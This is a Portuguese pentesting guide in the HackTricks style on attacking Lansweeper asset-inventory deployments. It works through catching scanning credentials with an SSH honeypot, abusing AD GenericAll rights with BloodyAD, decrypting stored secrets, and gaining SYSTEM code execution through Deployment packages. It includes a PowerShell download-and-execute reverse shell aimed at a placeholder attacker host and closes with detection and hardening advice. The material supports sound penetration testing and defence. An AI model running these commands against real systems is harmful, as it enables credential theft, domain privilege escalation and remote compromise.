# Abuso do Lansweeper: Harvesting de Credenciais, Descriptografia de Secrets e RCE via Deployment

{{#include ../../banners/hacktricks-training.md}}

Lansweeper é uma plataforma de descoberta e inventário de ativos de TI comumente implantada no Windows e integrada ao Active Directory. As credenciais configuradas no Lansweeper são usadas por seus mecanismos de scanning para autenticar-se em ativos por meio de protocolos como SSH, SMB/WMI e WinRM. Misconfigurations frequentemente permitem:

- Interceptação de credenciais ao redirecionar um alvo de scanning para um host controlado pelo atacante (honeypot)
- Abuso de ACLs do AD expostas por grupos relacionados ao Lansweeper para obter acesso remoto
- Descriptografia on-host de secrets configurados no Lansweeper (connection strings e credenciais de scanning armazenadas)
- Execução de código em endpoints gerenciados por meio do recurso Deployment (frequentemente executado como SYSTEM)

Esta página resume workflows práticos de ataque e comandos para abusar desses comportamentos durante engagements.

## 1) Harvesting de credenciais de scanning via honeypot (exemplo com SSH)

Ideia: criar um Scanning Target que aponte para o seu host e associar a ele Scanning Credentials existentes. Quando o scan for executado, o Lansweeper tentará autenticar-se usando essas credenciais, e seu honeypot irá capturá-las.<sup>[[1]](#references)</sup>

Visão geral das etapas (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (ou Single IP) = seu IP de VPN
- Configure a porta SSH para algo acessível (por exemplo, 2022 se a 22 estiver bloqueada)
- Desative o agendamento e planeje acionar manualmente
- Scanning → Scanning Credentials → certifique-se de que existam creds de Linux/SSH; associe-as ao novo target (ative todas conforme necessário)
- Clique em “Scan now” no target
- Execute um honeypot de SSH e obtenha o username/password tentado

Exemplo com sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.yaml
server:
listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
-v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Validar credenciais capturadas nos serviços do DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notas
- Outros protocolos não são equivalentes: um listener SMB/WinRM normalmente obtém um challenge-response NTLM, em vez de uma senha em texto claro. Quebrá-lo ou retransmiti-lo depende das proteções de protocolo negociadas; consulte [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md). A autenticação por senha SSH geralmente é o caso mais simples de texto claro.
- A autenticação SSH por chave pública expõe o nome de usuário e a impressão digital da chave pública ao servidor, **não** a chave privada nem sua passphrase. Recupere as credenciais associadas à chave no servidor Lansweeper comprometido, em vez de esperar que um honeypot as divulgue.<sup>[[2]](#references)</sup>
- Muitos scanners se identificam com client banners distintos (por exemplo, RebexSSH) e tentarão executar comandos benignos (uname, whoami etc.).

### A ordem de seleção das credenciais é importante

Durante uma nova varredura, o Lansweeper primeiro tenta novamente a credencial que teve sucesso por último para aquele asset, depois as credenciais mapeadas explicitamente, na ordem configurada, e por fim a credencial global do mesmo tipo. Portanto, um honeypot que aceita a primeira autenticação por senha normalmente não observará as credenciais de fallback posteriores; durante uma avaliação autorizada do caminho de credenciais, registre e rejeite as tentativas se o objetivo for verificar toda a sequência de fallback.<sup>[[6]](#references)</sup>

## 2) Abuso de ACLs do AD: obtenha acesso remoto adicionando-se a um grupo de administradores de aplicativos

Use o BloodHound para enumerar os direitos efetivos da conta comprometida. Uma descoberta comum é um grupo específico do scanner ou aplicativo (por exemplo, “Lansweeper Discovery”) que possui GenericAll sobre um grupo privilegiado (por exemplo, “Lansweeper Admins”). Se o grupo privilegiado também for membro de “Remote Management Users”, o WinRM ficará disponível assim que nos adicionarmos.<sup>[[1]](#references)[[5]](#references)</sup>

Exemplos de coleta:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Explorar GenericAll em um grupo com BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Em seguida, obtenha um shell interativo:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Dica: as operações do Kerberos são sensíveis ao tempo. Se encontrar KRB_AP_ERR_SKEW, sincronize primeiro com o DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Descriptografar secrets configurados do Lansweeper no host

No servidor do Lansweeper, o site ASP.NET normalmente armazena uma connection string criptografada e uma chave simétrica usada pela aplicação. Com acesso local apropriado, você pode descriptografar a connection string do DB e, em seguida, extrair as credenciais de scanning armazenadas.<sup>[[1]](#references)</sup>

Locais comuns:
- Configuração web: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Chave da aplicação: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Use SharpLansweeperDecrypt para automatizar a descriptografia e o dump das credenciais armazenadas. Sem argumentos, o executável atual descriptografa o `web.config`, conecta-se ao banco de dados e faz o dump de todas as credenciais de scanning configuradas; `-e` também oferece suporte à descriptografia offline/manual quando um valor criptografado e o arquivo de chave já estão disponíveis:<sup>[[3]](#references)</sup>
```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
-p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```
O resultado esperado inclui detalhes de conexão com o DB e credenciais de scanning em texto simples, como contas Windows e Linux usadas em todo o ambiente. Elas geralmente têm privilégios locais elevados nos hosts do domínio:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Use as creds de scanning do Windows recuperadas para acesso privilegiado:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Como membro de “Lansweeper Admins”, a interface web expõe Deployment e Configuration. Em Deployment → Deployment packages, você pode criar pacotes que executam comandos arbitrários nos assets selecionados. O Lansweeper usa uma credencial administrativa de scanning para acessar o Task Scheduler e o `C$` do alvo e, em seguida, cria uma task para o deployment. Quando o pacote usa o modo de execução **System Account**, o payload é executado como `NT AUTHORITY\SYSTEM`; outros modos de execução podem usar a credencial de scanning mapeada ou o usuário conectado no momento. Portanto, verifique o modo selecionado em vez de presumir que seja SYSTEM.<sup>[[1]](#references)[[7]](#references)</sup>

Etapas de alto nível:
- Crie um novo Deployment package que execute um one-liner do PowerShell ou cmd (reverse shell, add-user etc.).
- Selecione o asset desejado como alvo (por exemplo, o DC/host onde o Lansweeper é executado) e clique em Deploy/Run now.
- Obtenha seu shell como SYSTEM.

Exemplos de payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- As ações de deployment são ruidosas e deixam logs no Lansweeper e nos logs de eventos do Windows. Use com critério.

### Artefatos de deployment e um segundo ponto de exposição de credenciais

O scanner grava seu executável de deployment em `C:\Windows\LSDeployment` por meio de `C$`. Os arquivos dos pacotes normalmente são lidos de `DefaultPackageShare$`, respaldado por `C:\Program Files (x86)\Lansweeper\PackageShare`, ou de um package share específico para um intervalo de IP. É importante destacar que o Lansweeper documenta que a credencial do package share é armazenada **de forma reversivelmente criptografada no registro de todos os computadores que recebem um deployment**. Considere um endpoint gerenciado comprometido como um possível ponto de divulgação da conta desse share e inspecione o diretório de deployment, o histórico de tarefas agendadas e os package shares configurados ao reconstruir a atividade do Lansweeper.<sup>[[7]](#references)</sup>

## Detecção e hardening

- Restrinja ou remova enumerações SMB anônimas. Monitore RID cycling e acessos anômalos aos shares do Lansweeper.
- Controles de egresso: bloqueie ou restrinja rigorosamente SSH/SMB/WinRM de saída a partir dos hosts do scanner. Gere alertas para portas não padrão (por exemplo, 2022) e client banners incomuns, como Rebex.
- Proteja `Website\\web.config` e `Key\\Encryption.txt`. Externalize os secrets em um vault e faça a rotação quando houver exposição. Considere service accounts com privilégios mínimos e gMSA quando viável.
- Monitoramento do AD: gere alertas para alterações nos grupos relacionados ao Lansweeper (por exemplo, “Lansweeper Admins”, “Remote Management Users”) e para alterações de ACL que concedam associação GenericAll/Write em grupos privilegiados.
- Audite criações/alterações/execuções de pacotes de Deployment e correlacione novas tarefas agendadas remotas com gravações em `C:\Windows\LSDeployment`; gere alertas para pacotes que iniciem `cmd.exe`/`powershell.exe` ou conexões de saída inesperadas.
- Conceda às credenciais do package share apenas a permissão **Read & Execute** e nunca as reutilize para administração. Prefira um inventário baseado em agent quando for viável: se todos os computadores forem verificados por um agent e o módulo de deployment não for utilizado, o Lansweeper não exigirá credenciais de scanning de computadores armazenadas.<sup>[[6]](#references)[[7]](#references)</sup>

## Tópicos relacionados
- [Enumeração SMB/LSA/SAMR e RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Autenticação Kerberos e considerações sobre clock skew](kerberos-authentication.md)
- [Análise de caminhos do BloodHound](bloodhound.md)
- [Uso do WinRM e movimento lateral](../lateral-movement/winrm.md)



## References
- [1] [HTB: Sweep — Abusando do scanning do Lansweeper, ACLs do AD e secrets para obter controle de um DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [Criar e mapear credenciais de scanning — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Requisitos de deployment — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
